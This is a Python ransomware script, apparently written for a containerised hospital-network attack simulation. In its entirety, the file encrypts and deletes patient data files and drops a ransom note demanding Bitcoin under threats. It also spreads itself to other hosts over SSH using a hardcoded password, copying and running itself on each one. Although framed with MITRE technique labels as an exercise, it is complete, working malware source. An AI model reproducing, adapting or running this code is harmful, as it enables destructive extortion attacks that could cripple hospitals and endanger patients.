#!/usr/bin/env python3
"""Phase 3 — Ransomware payload (runs INSIDE the Docker containers).

Encrypts hospital data, then propagates to peer containers via SSH.
Maps to MITRE T1486 (Data Encrypted for Impact), T1021.004 (SSH),
T1018 (Remote System Discovery).
"""

import os
import shutil
import socket
import subprocess
import sys

from cryptography.fernet import Fernet

DATA_DIR = "/opt/hospital-data"
KEY_FILE = "/tmp/.ehr_key.key"
MARKER_FILE = "/tmp/.already_encrypted"
RANSOM_NOTE_PATH = os.path.join(DATA_DIR, "RANSOM_NOTE.txt")

TARGETS = ["10.10.10.10", "10.10.10.11", "10.10.10.12"]
SSH_USER = "ehradmin"
SSH_PASS = "Hospital2024!"

RANSOM_NOTE = """
================================================================
            YOUR HOSPITAL FILES HAVE BEEN ENCRYPTED
================================================================

All patient records, IoT configurations, and staff data on this
network have been encrypted with military-grade AES-256
encryption across multiple hospital systems.

To recover your data, transfer 5 BTC to the following address:
    bc1q9k7f3a2v8xe4m0t5n6rj7w2p8yc3d1hg0s4u6b

Then send proof of payment to: recovery.dept@proton.me
Include your hospital ID in the subject line.

You have 72 hours. After that the decryption key is permanently
deleted and your records will be unrecoverable.

Do not attempt to restore the files yourself — you will
corrupt them beyond repair.

Do not contact law enforcement — we will know, and the key
will be destroyed immediately.

Do not shut down or restart any machines on this network.

================================================================
"""


def get_own_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.10.10.1", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    return key


def encrypt_file(filepath, fernet):
    try:
        with open(filepath, "rb") as f:
            data = f.read()

        enc_path = filepath + ".enc"
        with open(enc_path, "wb") as f:
            f.write(fernet.encrypt(data))

        os.remove(filepath)
        print(f"  [ENCRYPTED] {os.path.basename(filepath)} -> "
              f"{os.path.basename(enc_path)}")
        return True
    except Exception as e:
        print(f"  [FAILED] {os.path.basename(filepath)}: {e}")
        return False


def encrypt_local_files():
    if os.path.exists(MARKER_FILE):
        print("[*] Already encrypted on this host, skipping.")
        return 0

    if not os.path.isdir(DATA_DIR):
        print(f"[!] Directory not found: {DATA_DIR}")
        return 0

    key = generate_key()
    fernet = Fernet(key)
    my_ip = get_own_ip() or "unknown"
    print(f"[*] Host: {my_ip}")
    print(f"[*] Key saved to {KEY_FILE}")
    print(f"[*] Target: {DATA_DIR}\n")

    count = 0
    for filename in sorted(os.listdir(DATA_DIR)):
        filepath = os.path.join(DATA_DIR, filename)
        if not os.path.isfile(filepath):
            continue
        if filename == "RANSOM_NOTE.txt" or filename.endswith(".enc"):
            continue
        if encrypt_file(filepath, fernet):
            count += 1

    with open(RANSOM_NOTE_PATH, "w") as f:
        f.write(RANSOM_NOTE)

    open(MARKER_FILE, "w").close()

    print(f"\n[*] {count} files encrypted on {my_ip}")
    print(f"[*] Ransom note: {RANSOM_NOTE_PATH}")
    return count


def scan_host(ip, port=22, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False


def host_already_hit(ip):
    cmd = [
        "sshpass", "-p", SSH_PASS,
        "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5",
        f"{SSH_USER}@{ip}",
        "test -f /tmp/.already_encrypted && echo HIT || echo CLEAN",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return "HIT" in result.stdout
    except Exception:
        return False


def propagate_to(ip):
    print(f"\n[*] Propagating to {ip}...")

    scp_cmd = [
        "sshpass", "-p", SSH_PASS,
        "scp", "-o", "StrictHostKeyChecking=no",
        "/tmp/ransomware.py", f"{SSH_USER}@{ip}:/tmp/ransomware.py",
    ]

    exec_cmd = [
        "sshpass", "-p", SSH_PASS,
        "ssh", "-o", "StrictHostKeyChecking=no",
        f"{SSH_USER}@{ip}", "python3 /tmp/ransomware.py",
    ]

    try:
        subprocess.run(scp_cmd, capture_output=True, timeout=15)
        result = subprocess.run(exec_cmd, capture_output=True, text=True, timeout=60)
        if result.stdout:
            for line in result.stdout.strip().split("\n"):
                print(f"  [{ip}] {line}")
        if result.returncode != 0 and result.stderr:
            print(f"  [{ip}] stderr: {result.stderr.strip()}")
    except subprocess.TimeoutExpired:
        print(f"  [{ip}] timed out")
    except Exception as e:
        print(f"  [{ip}] error: {e}")


def main():
    my_ip = get_own_ip()
    print(f"\n--- Ransomware executing on {my_ip or 'unknown'} ---\n")

    encrypt_local_files()

    self_path = os.path.abspath(__file__)
    if self_path != "/tmp/ransomware.py":
        try:
            shutil.copy2(self_path, "/tmp/ransomware.py")
        except Exception:
            pass

    print("\n[*] Scanning for other hosts on 10.10.10.0/24...")
    for target_ip in TARGETS:
        if target_ip == my_ip:
            continue

        if scan_host(target_ip):
            print(f"[*] {target_ip} is alive (port 22 open)")
            if host_already_hit(target_ip):
                print(f"[*] {target_ip} already encrypted, skipping")
                continue
            propagate_to(target_ip)
        else:
            print(f"[*] {target_ip} not reachable")

    print(f"\n[*] Propagation complete.")


if __name__ == "__main__":
    main()
